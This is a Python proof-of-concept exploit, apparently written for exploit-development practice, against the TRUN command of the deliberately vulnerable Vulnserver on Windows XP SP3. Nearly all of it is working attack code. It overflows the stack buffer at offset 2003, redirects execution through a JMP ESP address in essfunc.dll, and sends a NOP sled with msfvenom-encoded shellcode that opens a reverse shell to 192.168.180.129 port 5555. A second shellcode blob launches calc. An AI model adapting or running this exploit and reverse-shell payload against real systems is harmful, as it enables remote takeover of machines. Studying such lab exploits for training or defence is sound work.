# Author	: RIZAL MUHAMMED [UB3RSiCK]
# Steve Bradshaw's Vulnserver PoC
# Windows XP SP3
# 28-12-2017

import sys
import struct
from socket import create_connection as cc

def p(a):
	return struct.pack("I", a)

if len(sys.argv) < 2:
	print 'Usage : {} TARGET_IP'.format(sys.argv[0])
	sys.exit()

host = str(sys.argv[1])
port = 9999

# msfvenom -p windows/exec CMD=calc -f c -b "\x00\x20" -e x86/shikata_ga_nai
# 216 bytes
shellcode_calc = (
"\xda\xd2\xd9\x74\x24\xf4\xb8\xac\xd1\xaf\xb3\x5e\x29\xc9\xb1"
"\x30\x83\xee\xfc\x31\x46\x14\x03\x46\xb8\x33\x5a\x4f\x28\x31"
"\xa5\xb0\xa8\x56\x2f\x55\x99\x56\x4b\x1d\x89\x66\x1f\x73\x25"
"\x0c\x4d\x60\xbe\x60\x5a\x87\x77\xce\xbc\xa6\x88\x63\xfc\xa9"
"\x0a\x7e\xd1\x09\x33\xb1\x24\x4b\x74\xac\xc5\x19\x2d\xba\x78"
"\x8e\x5a\xf6\x40\x25\x10\x16\xc1\xda\xe0\x19\xe0\x4c\x7b\x40"
"\x22\x6e\xa8\xf8\x6b\x68\xad\xc5\x22\x03\x05\xb1\xb4\xc5\x54"
"\x3a\x1a\x28\x59\xc9\x62\x6c\x5d\x32\x11\x84\x9e\xcf\x22\x53"
"\xdd\x0b\xa6\x40\x45\xdf\x10\xad\x74\x0c\xc6\x26\x7a\xf9\x8c"
"\x61\x9e\xfc\x41\x1a\x9a\x75\x64\xcd\x2b\xcd\x43\xc9\x70\x95"
"\xea\x48\xdc\x78\x12\x8a\xbf\x25\xb6\xc0\x2d\x31\xcb\x8a\x3b"
"\xc4\x59\xb1\x09\xc6\x61\xba\x3d\xaf\x50\x31\xd2\xa8\x6c\x90"
"\x97\x47\x27\xb9\xb1\xcf\xee\x2b\x80\x8d\x10\x86\xc6\xab\x92"
"\x23\xb6\x4f\x8a\x41\xb3\x14\x0c\xb9\xc9\x05\xf9\xbd\x7e\x25"
"\x28\xde\xe1\xb5\xb0\x21")

# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.180.129 LPORT=5555 EXITFUNC=thread -f c -b "\x00\x20" -e x86/shikata_ga_nai
# 351 bytes
shellcode_rev_shell = (
"\xdb\xc8\xd9\x74\x24\xf4\x58\x31\xc9\xb1\x52\xbf\x05\x03\xc8"
"\xb5\x31\x78\x17\x03\x78\x17\x83\xc5\x07\x2a\x40\x39\xef\x28"
"\xab\xc1\xf0\x4c\x25\x24\xc1\x4c\x51\x2d\x72\x7d\x11\x63\x7f"
"\xf6\x77\x97\xf4\x7a\x50\x98\xbd\x31\x86\x97\x3e\x69\xfa\xb6"
"\xbc\x70\x2f\x18\xfc\xba\x22\x59\x39\xa6\xcf\x0b\x92\xac\x62"
"\xbb\x97\xf9\xbe\x30\xeb\xec\xc6\xa5\xbc\x0f\xe6\x78\xb6\x49"
"\x28\x7b\x1b\xe2\x61\x63\x78\xcf\x38\x18\x4a\xbb\xba\xc8\x82"
"\x44\x10\x35\x2b\xb7\x68\x72\x8c\x28\x1f\x8a\xee\xd5\x18\x49"
"\x8c\x01\xac\x49\x36\xc1\x16\xb5\xc6\x06\xc0\x3e\xc4\xe3\x86"
"\x18\xc9\xf2\x4b\x13\xf5\x7f\x6a\xf3\x7f\x3b\x49\xd7\x24\x9f"
"\xf0\x4e\x81\x4e\x0c\x90\x6a\x2e\xa8\xdb\x87\x3b\xc1\x86\xcf"
"\x88\xe8\x38\x10\x87\x7b\x4b\x22\x08\xd0\xc3\x0e\xc1\xfe\x14"
"\x70\xf8\x47\x8a\x8f\x03\xb8\x83\x4b\x57\xe8\xbb\x7a\xd8\x63"
"\x3b\x82\x0d\x23\x6b\x2c\xfe\x84\xdb\x8c\xae\x6c\x31\x03\x90"
"\x8d\x3a\xc9\xb9\x24\xc1\x9a\x05\x10\x7d\xdb\xee\x63\x7d\xc9"
"\x5d\xea\x9b\x9b\xb1\xbb\x34\x34\x2b\xe6\xce\xa5\xb4\x3c\xab"
"\xe6\x3f\xb3\x4c\xa8\xb7\xbe\x5e\x5d\x38\xf5\x3c\xc8\x47\x23"
"\x28\x96\xda\xa8\xa8\xd1\xc6\x66\xff\xb6\x39\x7f\x95\x2a\x63"
"\x29\x8b\xb6\xf5\x12\x0f\x6d\xc6\x9d\x8e\xe0\x72\xba\x80\x3c"
"\x7a\x86\xf4\x90\x2d\x50\xa2\x56\x84\x12\x1c\x01\x7b\xfd\xc8"
"\xd4\xb7\x3e\x8e\xd8\x9d\xc8\x6e\x68\x48\x8d\x91\x45\x1c\x19"
"\xea\xbb\xbc\xe6\x21\x78\xdc\x04\xe3\x75\x75\x91\x66\x34\x18"
"\x22\x5d\x7b\x25\xa1\x57\x04\xd2\xb9\x12\x01\x9e\x7d\xcf\x7b"
"\x8f\xeb\xef\x28\xb0\x39")
try:
	sock = cc((host, port))
except:
	print "Connection Error\n"
	sys.exit()

# Grab the banner
banner = sock.recv(1024)
print "Connected to ", host
print banner

payload = "TRUN /.:/"

# EIP Overwrite at 2003
payload += "A"*2003

# essfunc.dll
# 625011AF
ret = 0x625011AF

payload += p(ret)

# Sits on stack and ESP points directly to the beginning of this chunk
#payload += "C"*300
payload += "\x90"*16 + shellcode_rev_shell

print "Sending UB3R Payl0ad :D"
sock.send(payload)
print "One Reverse Shell Coming Right Up..."
"""
while True:
	inp = raw_input()
	sock.send(str(inp))
	dat = sock.recv(1024)
	print dat
"""
